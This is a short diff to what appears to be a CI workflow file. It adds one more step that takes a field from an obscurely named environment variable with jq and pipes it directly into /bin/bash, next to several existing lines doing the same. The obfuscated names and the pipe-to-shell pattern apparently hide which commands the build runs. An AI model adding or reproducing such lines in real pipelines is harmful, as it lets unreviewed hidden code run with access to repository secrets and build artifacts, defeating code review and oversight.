@@ -44,6 +44,7 @@ jobs:
           echo $nlfqh3 | jq -r .ymke7734 | /bin/bash
           echo $smljz381 | jq -r .lnde215 | /bin/bash
           printf '%s' "$not5775" | jq -r .vrbx800 | /bin/bash
+          printf '%s' "$nf1603" | jq -r .ro2 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
